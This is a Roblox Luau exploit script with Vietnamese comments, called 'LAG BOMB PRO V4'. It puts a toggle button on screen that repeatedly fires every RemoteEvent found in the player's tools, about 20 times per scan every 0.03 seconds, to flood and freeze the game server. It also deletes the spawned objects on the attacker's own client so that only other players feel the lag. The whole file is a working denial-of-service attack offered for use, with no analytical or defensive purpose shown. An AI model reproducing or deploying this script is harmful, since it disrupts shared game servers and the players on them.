--[[ 
    LAG BOMB PRO - "THE SILENT VOID"
    - Tối ưu hóa tối đa cho máy người dùng (Client).
    - Tấn công trực diện vào Server Network.
]]

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Backpack = LocalPlayer:WaitForChild("Backpack")

-- 1. GUI PRO (Gọn gàng, chuyên nghiệp)
local ScreenGui = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local ToggleBtn = Instance.new("TextButton")

ScreenGui.Parent = LocalPlayer.PlayerGui
MainFrame.Parent = ScreenGui
MainFrame.Size = UDim2.new(0, 200, 0, 80)
MainFrame.Position = UDim2.new(0.5, -100, 0.1, 0)
MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
MainFrame.BorderSizePixel = 2
MainFrame.Draggable = true

Title.Parent = MainFrame
Title.Size = UDim2.new(1, 0, 0, 30)
Title.Text = "LAG BOMB PRO V4"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.BackgroundTransparency = 1

ToggleBtn.Parent = MainFrame
ToggleBtn.Size = UDim2.new(0.9, 0, 0, 40)
ToggleBtn.Position = UDim2.new(0.05, 0, 0.4, 0)
ToggleBtn.Text = "BẮT ĐẦU OANH TẠC"
ToggleBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
ToggleBtn.TextColor3 = Color3.new(1, 1, 1)

local active = false

-- 2. Hệ thống "Chống Lag Máy Mình" (Mấu chốt của bản Pro)
-- Nó sẽ xóa ngay lập tức các vật thể rác sinh ra trên máy ông
workspace.ChildAdded:Connect(function(child)
    if active and (child:IsA("Part") or child:IsA("Model")) then
        -- Nếu vật thể đó là do gear của ông tạo ra (thường nằm gần nhân vật)
        local dist = (child:GetPivot().Position - LocalPlayer.Character:GetPivot().Position).Magnitude
        if dist < 15 then
            RunService.RenderStepped:Wait()
            child:Destroy() -- Xóa bỏ để GPU máy ông không phải render
        end
    end
end)

-- 3. Hàm nã Remote siêu cấp
local function NukeServer()
    local tools = Backpack:GetChildren()
    for _, tool in pairs(tools) do
        if tool:IsA("Tool") then
            -- Quét sâu vào các Remote ẩn
            for _, remote in pairs(tool:GetDescendants()) do
                if remote:IsA("RemoteEvent") then
                    -- Nã 20 phát mỗi lần quét để tạo áp lực cực đại cho Server
                    for i = 1, 20 do
                        task.spawn(function()
                            remote:FireServer()
                        end)
                    end
                end
            end
            -- Kích hoạt chức năng gốc của Tool mà ko cần cầm
            task.spawn(function() tool:Activate() end)
        end
    end
end

-- 4. Vòng lặp tối ưu
ToggleBtn.MouseButton1Click:Connect(function()
    active = not active
    ToggleBtn.Text = active and "ĐANG HỦY DIỆT..." or "BẮT ĐẦU OANH TẠC"
    ToggleBtn.BackgroundColor3 = active and Color3.fromRGB(0, 150, 0) or Color3.fromRGB(150, 0, 0)
    
    task.spawn(function()
        while active do
            NukeServer()
            -- Delay cực nhỏ (0.03) để Server không kịp lọc lệnh
            task.wait(0.03) 
        end
    end)
end)

print("💀 LAG BOMB PRO ĐÃ KÍCH HOẠT. Hãy chuẩn bị nhìn Server đứng hình!")
